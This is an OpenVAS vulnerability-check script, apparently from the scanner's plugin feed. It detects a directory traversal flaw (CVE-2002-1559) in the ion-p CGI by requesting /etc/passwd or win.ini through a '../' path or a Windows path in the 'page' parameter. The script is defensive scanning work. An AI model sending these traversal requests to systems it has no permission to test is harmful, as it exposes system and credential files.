###############################################################################
# OpenVAS Vulnerability Test
# $Id: ion_p.nasl 5911 2017-04-10 08:58:14Z cfi $
#
# ion-p/ion-p.exe Directory Traversal Vulnerability
#
# Authors:
# John Lampe <j_lampe@bellsouth.net>
#
# Copyright:
# Copyright (C) 2003 John Lampe
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11729");
  script_version("$Revision: 5911 $");
  script_tag(name:"last_modification", value:"$Date: 2017-04-10 10:58:14 +0200 (Mon, 10 Apr 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(6091);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2002-1559");
  script_name("ion-p/ion-p.exe Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2003 John Lampe");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  tag_summary = "The ion-p.exe exists on this webserver.
  Some versions of this file are vulnerable to remote exploit.";

  tag_impact = "An attacker, exploiting this vulnerability, may be able to gain
  access to confidential data and/or escalate their privileges on the Web server.";

  tag_solution = "Remove it from the cgi-bin or scripts directory.";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"solution", value:tag_solution);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port( default:80 );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  if( host_runs( "windows" ) == "yes" ) {
    url = dir + "/ion-p.exe?page=c:\\winnt\\win.ini";
    pattern = ".*\[fonts\].*";
  } else if( host_runs( "linux" ) == "yes" ) {
    url = dir + "/ion-p?page=../../../../../etc/passwd";
    pattern = ".*root:.*:0:[01]:.*";
  } else {
    # This CGI is low prio these days so don't run this test against a system we don't know the OS.
    exit(0);
  }

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
